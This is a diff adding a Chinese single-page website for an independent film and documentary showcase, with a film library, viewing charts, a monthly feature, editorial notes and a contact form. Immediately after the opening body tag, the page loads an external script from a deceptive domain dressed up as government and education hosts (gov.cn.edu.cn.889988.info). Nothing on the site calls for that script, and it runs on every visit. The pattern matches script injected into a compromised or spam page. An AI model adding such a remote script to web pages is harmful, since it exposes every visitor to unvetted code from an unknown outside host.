@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="origin-when-cross-origin">
+<title>七汉影视｜民间叙事影像档案 · 七汉影视 独立电影与纪录片线上展映</title>
+<meta name="description" content="七汉影视是一个聚焦民间叙事、独立电影与纪录影像的线上展映空间，收录乡土题材、城市观察、人物口述与短片实验作品，提供按主题、年代、片长筛选的片单与幕后创作手记，网址为 https://qihanyingshi-top.github.io 。">
+<meta name="keywords" content="七汉影视, 独立电影, 纪录片, 民间叙事, 短片展映, 影像档案, 乡土题材, 人物口述, 幕后手记, 片单推荐">
+<meta name="author" content="七汉影视编辑部">
+<meta name="theme-color" content="#0b0e14">
+<meta name="color-scheme" content="dark">
+<link rel="canonical" href="https://qihanyingshi-top.github.io">
+<style>
+:root{
+  --ink:#e8e6e1;
+  --ink-dim:#a8a49b;
+  --paper:#0b0e14;
+  --card:#141821;
+  --card-2:#1a1f2a;
+  --line:#2a303d;
+  --amber:#e2a84b;
+  --rust:#c2583a;
+  --teal:#5fa89a;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;
+  font-size:16px;
+  line-height:1.85;
+  -webkit-text-size-adjust:100%;
+}
+img{max-width:100%;height:auto;display:block}
+a{color:var(--amber);text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ── 顶部 ── */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(11,14,20,.92);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:18px;height:64px}
+.brand{font-size:19px;font-weight:700;letter-spacing:1px;color:#fff;white-space:nowrap}
+.brand small{display:block;font-size:10px;font-weight:400;color:var(--ink-dim);letter-spacing:2px;line-height:1.2}
+nav{margin-left:auto;display:flex;gap:4px}
+nav a{
+  color:var(--ink-dim);font-size:14px;padding:8px 12px;border-radius:6px;
+  transition:.2s;
+}
+nav a:hover{color:#fff;background:var(--card-2)}
+.menu-btn{display:none;background:none;border:1px solid var(--line);color:var(--ink);
+  width:40px;height:40px;border-radius:8px;font-size:20px;cursor:pointer}
+
+/* ── 主视觉 ── */
+.hero{
+  position:relative;overflow:hidden;
+  padding:90px 0 70px;
+  border-bottom:1px solid var(--line);
+}
+.hero::after{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(600px 300px at 82% 18%, rgba(226,168,75,.13), transparent 60%),
+    radial-gradient(500px 260px at 12% 78%, rgba(95,168,154,.10), transparent 60%);
+  pointer-events:none;
+}
+.hero-in{position:relative;z-index:2;display:grid;grid-template-columns:1.35fr .65fr;gap:54px;align-items:center}
+.kicker{font-size:12px;letter-spacing:4px;color:var(--teal);text-transform:uppercase}
+.hero h1{
+  font-size:clamp(34px,6vw,62px);line-height:1.12;margin:14px 0 18px;font-weight:800;
+}
+.hero h1 em{font-style:normal;color:var(--amber)}
+.hero p{color:var(--ink-dim);font-size:17px;max-width:52ch;margin:0 0 26px}
+.hero-actions{display:flex;flex-wrap:wrap;gap:12px}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 24px;border-radius:999px;font-size:15px;font-weight:600;
+  border:1px solid var(--amber);color:var(--amber);
+  transition:.25s;
+}
+.btn:hover{background:var(--amber);color:#0b0e14}
+.btn.ghost{border-color:var(--line);color:var(--ink)}
+.btn.ghost:hover{border-color:var(--teal);color:var(--teal);background:transparent}
+.hero-side{border:1px solid var(--line);border-radius:16px;padding:24px;background:var(--card)}
+.hero-side h3{margin:0 0 14px;font-size:14px;letter-spacing:2px;color:var(--ink-dim);font-weight:500}
+.stat-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px dashed var(--line);font-size:14px}
+.stat-row:last-child{border-bottom:0}
+.stat-row b{color:#fff;font-size:16px}
+.url-line{margin-top:18px;padding:12px 14px;background:var(--paper);border:1px solid var(--line);
+  border-radius:8px;font-size:12px;word-break:break-all;color:var(--ink-dim)}
+.url-line b{color:var(--amber);font-weight:600}
+
+/* ── 通用区块 ── */
+section{padding:78px 0;border-bottom:1px solid var(--line)}
+.eyebrow{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:34px}
+.eyebrow .num{font-size:13px;color:var(--rust);letter-spacing:2px;font-weight:700}
+.eyebrow h2{margin:0;font-size:clamp(24px,3.6vw,34px);font-weight:800;letter-spacing:.5px}
+.eyebrow .sub{color:var(--ink-dim);font-size:14px}
+
+/* ── 片库 ── */
+.filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:30px}
+.filters button{
+  background:var(--card);border:1px solid var(--line);color:var(--ink-dim);
+  padding:9px 18px;border-radius:999px;font-size:14px;cursor:pointer;transition:.2s;
+}
+.filters button:hover{border-color:var(--amber);color:var(--amber)}
+.filters button.on{background:var(--amber);border-color:var(--amber);color:#0b0e14;font-weight:600}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s}
+.film:hover{transform:translateY(-5px);border-color:var(--amber)}
+.poster{position:relative;aspect-ratio:3/4;background:linear-gradient(160deg,var(--card-2),var(--paper))}
+.poster .ph{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:10px;padding:20px;text-align:center}
+.poster .ph i{width:46px;height:46px;border:2px solid var(--amber);border-radius:50%;opacity:.5}
+.poster .ph span{font-size:13px;color:var(--ink-dim);letter-spacing:1px}
+.tag-lang{position:absolute;top:12px;left:12px;background:rgba(11,14,20,.85);color:var(--teal);
+  font-size:11px;padding:4px 10px;border-radius:6px;border:1px solid var(--line)}
+.tag-rate{position:absolute;top:12px;right:12px;background:var(--amber);color:#0b0e14;
+  font-size:12px;font-weight:700;padding:4px 10px;border-radius:6px}
+.poster .year{position:absolute;bottom:12px;left:12px;font-size:11px;color:var(--ink-dim);letter-spacing:1px}
+.film-body{padding:16px 18px 18px}
+.film-body h3{margin:0 0 6px;font-size:16px}
+.film-body p{margin:0;font-size:13px;color:var(--ink-dim);line-height:1.6;
+  display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.film-body .meta{margin-top:12px;display:flex;justify-content:space-between;font-size:12px;color:var(--ink-dim)}
+
+/* ── 榜单 ── */
+.rank{display:grid;grid-template-columns:1.1fr .9fr;gap:44px}
+.rank-list{counter-reset:r}
+.rank-item{
+  display:flex;gap:16px;align-items:flex-start;
+  padding:18px 0;border-bottom:1px solid var(--line);
+}
+.rank-item:first-child{padding-top:0}
+.rank-item .n{counter-increment:r;font-size:26px;font-weight:800;color:var(--line);line-height:1;min-width:38px}
+.rank-item:nth-child(1) .n,.rank-item:nth-child(2) .n,.rank-item:nth-child(3) .n{color:var(--amber)}
+.rank-item .txt h3{margin:0 0 4px;font-size:16px}
+.rank-item .txt p{margin:0;font-size:13px;color:var(--ink-dim);line-height:1.6}
+.rank-item .score{margin-left:auto;text-align:right;font-size:13px;color:var(--teal);white-space:nowrap}
+.rank-aside{border:1px solid var(--line);border-radius:16px;padding:26px;background:var(--card);align-self:start}
+.rank-aside h3{margin:0 0 6px;font-size:18px}
+.rank-aside > p{margin:0 0 20px;font-size:13px;color:var(--ink-dim)}
+.bar{margin-bottom:16px}
+.bar .l{display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px}
+.bar .track{height:7px;background:var(--paper);border-radius:99px;overflow:hidden;border:1px solid var(--line)}
+.bar .fill{height:100%;background:linear-gradient(90deg,var(--rust),var(--amber));border-radius:99px}
+
+/* ── 专题 ── */
+.feature{display:grid;grid-template-columns:1.15fr .85fr;gap:0;border:1px solid var(--line);border-radius:18px;overflow:hidden;background:var(--card)}
+.feature .cover{position:relative;min-height:340px;background:linear-gradient(150deg,#2a2230,#0f1a1c)}
+.feature .cover .ph{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:14px;padding:30px;text-align:center}
+.feature .cover .ph b{font-size:15px;letter-spacing:6px;color:var(--amber)}
+.feature .cover .ph span{font-size:13px;color:var(--ink-dim)}
+.feature .cover .big{position:absolute;left:22px;bottom:18px;font-size:64px;font-weight:800;color:rgba(255,255,255,.06);line-height:1}
+.feature .body{padding:36px 38px}
+.feature .body .cat{font-size:12px;letter-spacing:3px;color:var(--rust)}
+.feature .body h3{margin:10px 0 14px;font-size:26px;line-height:1.35}
+.feature .body p{margin:0 0 14px;color:var(--ink-dim);font-size:15px}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin:22px 0 26px}
+.chips span{font-size:12px;padding:6px 13px;border:1px solid var(--line);border-radius:99px;color:var(--ink-dim)}
+.chips span:hover{border-color:var(--teal);color:var(--teal)}
+
+/* ── 资讯 ── */
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.nbox{border-bottom:1px solid var(--line);padding-bottom:22px}
+.nbox time{font-size:12px;color:var(--amber);letter-spacing:1px}
+.nbox h3{margin:10px 0 8px;font-size:18px;line-height:1.45}
+.nbox p{margin:0;font-size:14px;color:var(--ink-dim);line-height:1.75}
+.nbox a{display:inline-block;margin-top:12px;font-size:13px;color:var(--teal)}
+
+/* ── 关于 ── */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:start}
+.about h2{font-size:clamp(24px,3.6vw,34px);margin:0 0 20px;line-height:1.3}
+.about p{color:var(--ink-dim);margin:0 0 16px}
+.principles{margin-top:26px;border-top:1px solid var(--line);padding-top:26px}
+.principle{position:relative;padding-left:26px;margin-bottom:20px}
+.principle::before{content:"";position:absolute;left:0;top:10px;bottom:-22px;width:2px;background:var(--line)}
+.principle:last-child::before{display:none}
+.principle b{display:block;font-size:16px;margin-bottom:3px}
+.principle span{font-size:14px;color:var(--ink-dim)}
+
+/* ── 联系 ── */
+.contact{display:grid;grid-template-columns:1fr 1.1fr;gap:46px}
+.contact .info h3{margin:0 0 8px;font-size:20px}
+.contact .info > p{color:var(--ink-dim);font-size:14px;margin:0 0 24px}
+.ci{display:flex;gap:14px;padding:14px 0;border-bottom:1px solid var(--line)}
+.ci .k{font-size:12px;color:var(--rust);letter-spacing:2px;min-width:74px;padding-top:2px}
+.ci .v{font-size:14px;line-height:1.7}
+form{display:grid;gap:14px}
+form .row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+input,textarea,select{
+  width:100%;background:var(--card);border:1px solid var(--line);border-radius:10px;
+  color:var(--ink);font-size:15px;font-family:inherit;padding:13px 15px;
+}
+input:focus,textarea:focus,select:focus{outline:none;border-color:var(--amber)}
+textarea{min-height:120px;resize:vertical}
+form button{
+  justify-self:start;padding:14px 34px;border-radius:999px;background:var(--amber);
+  border:0;color:#0b0e14;font-size:15px;font-weight:700;cursor:pointer;
+}
+form button:hover{background:var(--teal);color:#0b0e14}
+
+/* ── 页脚 ── */
+footer{border-top:1px solid var(--line);padding:44px 0 30px;background:var(--paper)}
+.foot-top{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:36px;margin-bottom:34px}
+.foot-top h4{margin:0 0 14px;font-size:15px;color:#fff}
+.foot-top ul{margin:0;padding:0;list-style:none}
+.foot-top li{padding:5px 0;font-size:13px;color:var(--ink-dim)}
+.foot-top li a{color:var(--ink-dim)}
+.foot-top li a:hover{color:var(--amber)}
+.copy{display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between;
+  padding-top:24px;border-top:1px solid var(--line);font-size:12px;color:var(--ink-dim)}
+.copy b{color:var(--amber)}
+
+/* ── 响应式 ── */
+@media (max-width:960px){
+  .hero-in,.rank,.feature,.about,.contact,.foot-top{grid-template-columns:1fr}
+  .grid{grid-template-columns:repeat(3,1fr)}
+  .news{grid-template-columns:repeat(2,1fr)}
+  .feature .cover{min-height:240px}
+}
+@media (max-width:720px){
+  .menu-btn{display:block}
+  nav{
+    position:fixed;inset:64px 0 0 0;width:100%;height:calc(100vh - 64px);
+    flex-direction:column;gap:0;margin:0;
+    background:rgba(11,14,20,.98);padding:18px 0;
+    transform:translateX(100%);transition:.3s;
+  }
+  nav.open{transform:translateX(0)}
+  nav a{border-radius:0;padding:15px 24px;border-bottom:1px solid var(--line);font-size:16px}
+  .hero{padding:54px 0 46px}
+  .grid,.news{grid-template-columns:repeat(2,1fr);gap:16px}
+  .feature .body{padding:26px 24px}
+  form .row{grid-template-columns:1fr}
+  .rank{gap:34px}
+}
+@media (max-width:440px){
+  .wrap{padding:0 16px}
+  .grid,.news{grid-template-columns:1fr}
+  .hero-actions .btn{flex:1;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="#top">七汉影视<small>QIHAN YINGSHI</small></a>
+    <button class="menu-btn" id="mb" aria-label="打开导航菜单">≡</button>
+    <nav id="nav">
+      <a href="#top">首页</a>
+      <a href="#library">片库</a>
+      <a href="#rank">榜单</a>
+      <a href="#feature">专题</a>
+      <a href="#news">资讯</a>
+      <a href="#about">关于</a>
+      <a href="#contact">联系</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 主视觉 -->
+  <section class="hero" id="top">
+    <div class="wrap hero-in">
+      <div>
+        <div class="kicker">Independent Film &amp; Documentary Archive</div>
+        <h1>把被忽略的<em>日常</em>，<br>拍成能反复看的影像</h1>
+        <p>七汉影视是一个民间影像档案式展映空间。我们不追热点，只收那些在县城、工地、海边、老街和通勤路上被拍下来的故事——长片、短片、纪录片、口述影像，按主题与年份整理，配创作手记。</p>
+        <div class="hero-actions">
+          <a class="btn" href="#library">进片库看看 ›</a>
+          <a class="btn ghost" href="#feature">本月专题</a>
+        </div>
+      </div>
+      <aside class="hero-side">
+        <h3>本季展映速览</h3>
+        <div class="stat-row"><span>在库作品</span><b>1,260 部</b></div>
+        <div class="stat-row"><span>本月新增</span><b>38 部</b></div>
+        <div class="stat-row"><span>幕后手记</span><b>214 篇</b></div>
+        <div class="stat-row"><span>合作创作者</span><b>96 位</b></div>
+        <div class="url-line">官方地址：<br><b>https://qihanyingshi-top.github.io</b></div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 片库 -->
+  <section id="library">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="num">01 / LIBRARY</span>
+        <h2>片库：按主题找片，比按明星找更准</h2>
+        <span class="sub">六个常设单元，每月补一批</span>
+      </div>
+      <div class="filters" id="filters">
+        <button class="on">全部</button>
+        <button>乡土纪实</button>
+        <button>城市观察</button>
+        <button>人物口述</button>
+        <button>短片实验</button>
+        <button>影像档案</button>
+      </div>
+      <div class="grid">
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">8.7</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2024 · 112 min</span>
+          </div>
+          <div class="film-body">
+            <h3>麦收之前的那条河</h3>
+            <p>导演跟着豫东一个村子拍了三年，记录一条灌溉渠被填平前后，六户人家怎么商量、怎么争吵、又怎么沉默。</p>
+            <div class="meta"><span>乡土纪实</span><span>纪录片</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">8.2</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2025 · 24 min</span>
+          </div>
+          <div class="film-body">
+            <h3>夜班便利店</h3>
+            <p>十五个夜班店员的自述剪在一起，没有旁白，只有收银台的叮声、泡面热水声和凌晨三点的雨。</p>
+            <div class="meta"><span>城市观察</span><span>短片</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">8.9</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2023 · 68 min</span>
+          </div>
+          <div class="film-body">
+            <h3>阿婆的日历</h3>
+            <p>一位潮汕老人用日历上的红圈记录儿子的归期，拍了五年，日历换了六本，儿子回来过两次。</p>
+            <div class="meta"><span>人物口述</span><span>纪录长片</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">7.8</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2025 · 9 min</span>
+          </div>
+          <div class="film-body">
+            <h3>把阳台种满</h3>
+            <p>全片只有一个固定机位，拍一栋老楼里十二个阳台从春到冬的变化，配邻居们随手哼的歌。</p>
+            <div class="meta"><span>短片实验</span><span>影像诗</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">8.4</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2022 · 45 min</span>
+          </div>
+          <div class="film-body">
+            <h3>县剧团最后一季</h3>
+            <p>县级剧团解散前的最后一轮下乡演出，演员边化妆边算账，后台比台上更值得看。</p>
+            <div class="meta"><span>影像档案</span><span>纪实</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">8.0</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2024 · 33 min</span>
+          </div>
+          <div class="film-body">
+            <h3>摆渡人</h3>
+            <p>长江边最后一个人工摆渡口，船工和乘客都不急，只有镜头在数来往的人数。</p>
+            <div class="meta"><span>乡土纪实</span><span>短片</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">7.6</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2025 · 16 min</span>
+          </div>
+          <div class="film-body">
+            <h3>工位上的植物</h3>
+            <p>拍写字楼里被员工养活的绿植，再拍养它们的人，发现浇水最勤的那位最先离职。</p>
+            <div class="meta"><span>城市观察</span><span>实验</span></div>
+          </div>
+        </article>
+        <article class="film">
+          <div class="poster">
+            <span class="tag-lang">华语</span><span class="tag-rate">8.5</span>
+            <div class="ph"><i></i><span>海报位</span></div>
+            <span class="year">2021 · 96 min</span>
+          </div>
+          <div class="film-body">
+            <h3>修表匠的十年</h3>
+            <p>师傅不怎么说话，镜头就只拍他的手和放大镜，十年里修过的表比说过的话多得多。</p>
+            <div class="meta"><span>人物口述</span><span>纪录</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 榜单 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="num">02 / CHART</span>
+        <h2>季度榜单：观众回看次数说话</h2>
+        <span class="sub">统计周期为近 90 天，只算完整播放</span>
+      </div>
+      <div class="rank">
+        <div class="rank-list">
+          <div class="rank-item">
+            <div class="n"></div>
+            <div class="txt">
+              <h3>阿婆的日历</h3>
+              <p>人物口述 · 68 min · 2023</p>
+            </div>
+            <div class="score">回看 4.2 次</div>
+          </div>
+          <div class="rank-item">
+            <div class="n"></div>
+            <div class="txt">
+              <h3>麦收之前的那条河</h3>
+              <p>乡土纪实 · 112 min · 2024</p>
+            </div>
+            <div class="score">回看 3.8 次</div>
+          </div>
+          <div class="rank-item">
+            <div class="n"></div>
+            <div class="txt">
+              <h3>县剧团最后一季</h3>
+              <p>影像档案 · 45 min · 2022</p>
+            </div>
+            <div class="score">回看 3.5 次</div>
+          </div>
+          <div class="rank-item">
+            <div class="n"></div>
+            <div class="txt">
+              <h3>夜班便利店</h3>
+              <p>城市观察 · 24 min · 2025</p>
+            </div>
+            <div class="score">回看 3.1 次</div>
+          </div>
+          <div class="rank-item">
+            <div class="n"></div>
+            <div class="txt">
+              <h3>修表匠的十年</h3>
+              <p>人物口述 · 96 min · 2021</p>
+            </div>
+            <div class="score">回看 2.9 次</div>
+          </div>
+          <div class="rank-item">
+            <div class="n"></div>
+            <div class="txt">
+              <h3>摆渡人</h3>
+              <p>乡土纪实 · 33 min · 2024</p>
+            </div>
+            <div class="score">回看 2.6 次</div>
+          </div>
+        </div>
+        <aside class="rank-aside">
+          <h3>题材热度分布</h3>
+          <p>哪类故事被反复点开，一目了然</p>
+          <div class="bar"><div class="l"><span>人物口述</span><span>32%</span></div><div class="track"><div class="fill" style="width:32%"></div></div></div>
+          <div class="bar"><div class="l"><span>乡土纪实</span><span>26%</span></div><div class="track"><div class="fill" style="width:26%"></div></div></div>
+          <div class="bar"><div class="l"><span>城市观察</span><span>19%</span></div><div class="track"><div class="fill" style="width:19%"></div></div></div>
+          <div class="bar"><div class="l"><span>影像档案</span><span>13%</span></div><div class="track"><div class="fill" style="width:13%"></div></div></div>
+          <div class="bar"><div class="l"><span>短片实验</span><span>10%</span></div><div class="track"><div class="fill" style="width:10%"></div></div></div>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <!-- 专题 -->
+  <section id="feature">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="num">03 / FEATURE</span>
+        <h2>本月专题：离乡者的通讯录</h2>
+        <span class="sub">十一部作品 + 七篇创作者手记</span>
+      </div>
+      <div class="feature">
+        <div class="cover">
+          <div class="ph"><b>专 题</b><span>FEATURE / 2026.10</span></div>
+          <span class="big">07</span>
+        </div>
+        <div class="body">
+          <div class="cat">FEATURE STORY</div>
+          <h3>他们离开村子之后，还往回打了多少电话</h3>
+          <p>这一组片子共同关心一件事：人走了，关系怎么留。有在东莞工厂宿舍里给母亲打视频的年轻妈妈，有每年只回来一次的包工头，也有再没回去过的那个孩子。</p>
+          <p>选片标准很简单——片子里必须出现一次真实的电话通话，无论长短。十一部作品横跨 2018 到 2026，按通话发生的地点排列，从村口小卖部排到异地的出租屋。</p>
+          <div class="chips">
+            <span>11 部影片</span><span>7 篇手记</span><span>跨度 8 年</span><span>平均片长 41 min</span><span>可单集看</span>
+          </div>
+          <a class="btn ghost" href="#">进入专题展映</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 资讯 -->
+  <section id="news">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="num">04 / NOTES</span>
+        <h2>编辑手记：选片、拍片与改片</h2>
+        <span class="sub">不定期更新，写片比写影评慢</span>
+      </div>
+      <div class="news">
+        <article class="nbox">
+          <time datetime="2026-10-12">2026 年 10 月 12 日</time>
+          <h3>为什么我们把「完整播放」当作唯一指标</h3>
+          <p>点赞和收藏都太轻。一部片子被人从头看到尾，甚至再看一遍，才是它真正被接住的证据。</p>
+          <a href="#">读全文 ›</a>
+        </article>
+        <article class="nbox">
+          <time datetime="2026-09-28">2026 年 9 月 28 日</time>
+          <h3>跟拍三年的代价：硬盘比素材先坏</h3>
+          <p>一位创作者的口述：六个硬盘坏了四个，最后靠邻居帮忙恢复出三分之一，剩下的只能靠回忆补。</p>
+          <a href="#">读全文 ›</a>
+        </article>
+        <article class="nbox">
+          <time datetime="2026-09-15">2026 年 9 月 15 日</time>
+          <h3>县城题材为什么总被拍成「奇观」</h3>
+          <p>把县城当猎奇背景的片子我们一律不收。生活不需要解释，只需要被看见，而且要看得久一点。</p>
+          <a href="#">读全文 ›</a>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about">
+    <div class="wrap about">
+      <div>
+        <div class="eyebrow"><span class="num">05 / ABOUT</span><h2>关于七汉影视</h2></div>
+        <p>七汉影视成立于 2019 年，原本只是几个拍片的人凑在一起存素材的地方，后来慢慢变成一个对外开放的线上展映空间。我们不做资讯聚合，不做流量分发，只做一件事：把值得被反复看的民间影像留下来、排好序、写上几句实话。</p>
+        <p>目前片库有 1,260 部作品，涵盖长片、短片、纪录片与口述影像，全部由创作者授权或由家属代为授权。我们不接受付费上架，也不卖榜单位置。</p>
+        <p>选片由三位常驻编辑和若干位轮换的外部选片人完成，每人每季最多推荐三部，避免一个人的口味统治整个片库。</p>
+      </div>
+      <div class="principles">
+        <div class="principle"><b>慢一点没关系</b><span>更新频率服从作品成熟度，不等热点，也不追档期。</span></div>
+        <div class="principle"><b>不解释生活</b><span>片子里的生活不需要旁白替它说话，我们尽量不加字幕以外的说明。</span></div>
+        <div class="principle"><b>授权先于上线</b><span>每一部作品上线前都要确认授权链条，家属代授权的会明确标注。</span></div>
+        <div class="principle"><b>手记比评分重要</b><span>创作者写的两百字拍摄经过，往往比任何评分都更能帮你看懂一部片子。</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 联系 -->
+  <section id="contact">
+    <div class="wrap contact">
+      <div class="info">
+        <div class="eyebrow"><span class="num">06 / CONTACT</span><h3>寄片、合作与反馈</h3></div>
+        <p>作品投递、展映合作、授权确认、网站使用上的问题，都可以通过下面的方式找到我们。一般会在五个工作日内回复。</p>
+        <div class="ci"><span class="k">官方网站</span><span class="v">https://qihanyingshi-top.github.io</span></div>
+        <div class="ci"><span class="k">作品投递</span><span class="v">film@qihanyingshi-top.github.io<br>请附完整片与三百字以内创作说明</span></div>
+        <div class="ci"><span class="k">展映合作</span><span class="v">space@qihanyingshi-top.github.io<br>高校、美术馆、社区放映均可谈</span></div>
+        <div class="ci"><span class="k">授权与下架</span><span class="v">right@qihanyingshi-top.github.io<br>亲属代授权与下架申请同此邮箱</span></div>
+        <div class="ci"><span class="k">办公地址</span><span class="v">江苏省宿迁市（线上为主，面谈需预约）</span></div>
+      </div>
+      <form action="#" method="post" onsubmit="return false">
+        <div class="row">
+          <input type="text" name="name" placeholder="怎么称呼你" required>
+          <input type="email" name="email" placeholder="邮箱地址" required>
+        </div>
+        <select name="topic">
+          <option>我想投递作品</option>
+          <option>我想谈展映合作</option>
+          <option>授权或下架事宜</option>
+          <option>网站使用反馈</option>
+          <option>其他</option>
+        </select>
+        <textarea name="msg" placeholder="说说片子的情况，或者你想聊的事（建议 100 字以上）" required></textarea>
+        <button type="submit">把信发出去 ›</button>
+      </form>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-top">
+      <div>
+        <a class="brand" href="#top">七汉影视<small>QIHAN YINGSHI</small></a>
+        <p style="margin:14px 0 0;font-size:13px;color:var(--ink-dim);max-width:38ch">
+          民间叙事影像档案与线上展映空间，收录值得反复看的独立电影与纪录影像。
+        </p>
+      </div>
+      <div>
+        <h4>站内导航</h4>
+        <ul>
+          <li><a href="#library">片库单元</a></li>
+          <li><a href="#rank">季度榜单</a></li>
+          <li><a href="#feature">本月专题</a></li>
+          <li><a href="#news">编辑手记</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>相关入口</h4>
+        <ul>
+          <li><a href="#about">关于七汉影视</a></li>
+          <li><a href="#contact">联系方式</a></li>
+          <li><a href="#">作品授权说明</a></li>
+          <li><a href="#">https://qihanyingshi-top.github.io</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <span id="yr">2026</span> 七汉影视 · 本站为静态单页，内页链接以锚点形式呈现</span>
+      <span>官方网址：<b>https://qihanyingshi-top.github.io</b></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+var mb = document.getElementById('mb'), nav = document.getElementById('nav');
+mb.addEventListener('click', function(){ nav.classList.toggle('open'); });
+nav.addEventListener('click', function(e){ if(e.target.tagName === 'A') nav.classList.remove('open'); });
+document.querySelectorAll('.filters button').forEach(function(b){
+  b.addEventListener('click', function(){
+    document.querySelectorAll('.filters button').forEach(function(x){ x.classList.remove('on'); });
+    b.classList.add('on');
+  });
+});
+var links = document.querySelectorAll('#nav a');
+var secs = document.querySelectorAll('main section');
+window.addEventListener('scroll', function(){
+  var y = window.scrollY + 120, cur = '';
+  secs.forEach(function(s){ if(s.offsetTop <= y) cur = s.id; });
+  links.forEach(function(a){ a.classList.toggle('on', a.getAttribute('href') === '#' + cur); });
+});
+</script>
+</body>
+</html>
